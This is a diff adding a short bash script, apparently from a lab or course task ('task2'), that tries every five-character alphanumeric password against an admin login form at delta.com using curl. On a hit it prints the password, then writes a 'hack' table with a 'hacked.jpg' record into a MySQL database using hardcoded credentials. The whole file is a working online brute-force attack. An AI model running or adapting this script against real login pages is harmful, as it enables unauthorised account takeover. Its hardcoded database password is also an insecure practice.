@@ -1,0 +1,20 @@
+#!/bin/bash
+allowed="A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z 1 2 3 4 5 6 7 8 9 0"
+for i in $allowed;do
+	for j in $allowed;do
+		for k in $allowed;do
+			for l in $allowed;do
+				for m in $allowed;do
+					password=$i$j$k$l$m
+					result=$(curl -s --data "name=admin&password=$password" http://delta.com/submit.php|grep "Correct"|wc -w)
+					if [ $result -eq 3 ];then
+						echo $password "is the correct password"
+						mysql --user=SysAd --password=password -e "use task2;create table hack(image varchar(30),Time timestamp NOT NULL);"
+						mysql --user=SysAd --password=password -e "use task2;insert into hack values('hacked.jpg',NOW());"
+						exit
+					fi
+				done
+			done
+		done
+	done
+done
